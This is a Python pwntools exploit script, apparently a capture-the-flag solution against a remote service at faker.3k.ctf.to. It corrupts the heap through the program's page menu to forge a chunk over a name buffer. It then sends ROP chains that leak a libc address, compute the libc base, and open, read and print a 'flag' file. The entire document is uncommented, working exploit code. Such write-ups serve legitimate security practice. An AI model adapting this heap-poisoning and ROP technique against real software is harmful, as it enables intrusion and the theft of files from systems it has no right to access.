from pwn import *
from pwn import log as Log
from time import sleep
puts_plt = 0x4008c0
start = 0x400ee8
pop_rdi = 0x0000000000401123
main_start_got = 0x0000000000601ff0
period = 0.4

def log(title,value):
	Log.info(title + ": {} ".format(hex(value)))
#p = process("./main")
p = remote("faker.3k.ctf.to",5231)
def new_page(size):
	p.sendline("1")
	sleep(period)
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)

def edit(index,data):
	p.sendline("2")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)
	p.recv(8000)
	p.send(data)
	sleep(period)
	p.recv(8000)

def delete_page(index):
	p.sendline("3")
	sleep(period)
	p.recv(8000)
	p.sendline(str(index))
	sleep(period)
	p.recv(8000)

def login(size,name):
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)
	p.send(name)
	sleep(period)
	p.recv(8000)

def relogin(name):
	p.sendline("4")
	sleep(period)
	p.recv(8000)
	p.send(name)
	sleep(period)
	p.recv(8000)
def Exit():
	p.sendline("5")
	sleep(period)
name_addr = 0x602150
def rop(chain):
	if len(chain) > 72:
		print "Tooo much..."
		exit(0)

	
	new_page(0x70)
	delete_page(0)
	edit(0,p64(name_addr))
	new_page(0x70)
	new_page(0x70)
	edit(1,"A"*0x8 + p64(0x70) + "B"*8 + chain)
	relogin("\n")
	Exit()
payload = ""
payload += p64(0)
payload += p64(0x81)
login(16,payload)

for _ in range(7):
	new_page(0x70)
	delete_page(0)
payload = ""
payload += p64(pop_rdi)
payload += p64(main_start_got)
payload += p64(puts_plt)
payload += p64(start)
#pause()
rop(payload)
leak = p.recvline().strip()
leak = u64(leak.ljust(8,"\x00"))
log("leak",leak)
base = leak - 0x0000000000021ab0
opn = base + 0x000000000010fd50
read = base + 0x0000000000110180
pop_rsi = base + 0x0000000000023e8a
pop_rdx = base + 0x0000000000001b96
log("base",base)
log("read",read)
log("open",opn)
payload = ""
payload += p64(0)
payload += p64(0x81)
#p.interactive()
login(16,payload)
payload = ""
#### open
payload += p64(pop_rdi)
payload += p64(name_addr+0x10)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(opn)
payload += p64(start)
edit(1,"flag\x00" + "A"*0x3 + p64(0x70) + "B"*8 + payload)
relogin("\n")
#pause()
Exit()
payload = ""
payload += p64(0)
payload += p64(0x81)
login(16,payload)
payload = ""
payload += p64(pop_rdi)
payload += p64(6)
payload += p64(pop_rsi)
payload += p64(name_addr+100)
payload += p64(pop_rdx)
payload += p64(0x50)
payload += p64(read)
payload += p64(start)
print len(payload)
edit(1,"flag\x00" + "A"*0x3 + p64(0x70) + "B"*8 + payload)
relogin("\n")
Exit()
payload = ""
payload += p64(0)
payload += p64(0x81)
login(16,payload)
payload = ""
#### write
payload += p64(pop_rdi)
payload += p64(name_addr+100)
payload += p64(puts_plt)
print len(payload)
edit(1,"flag\x00" + "A"*0x3 + p64(0x70) + "B"*8 + payload)
relogin("\n")
#pause()
Exit()
p.interactive()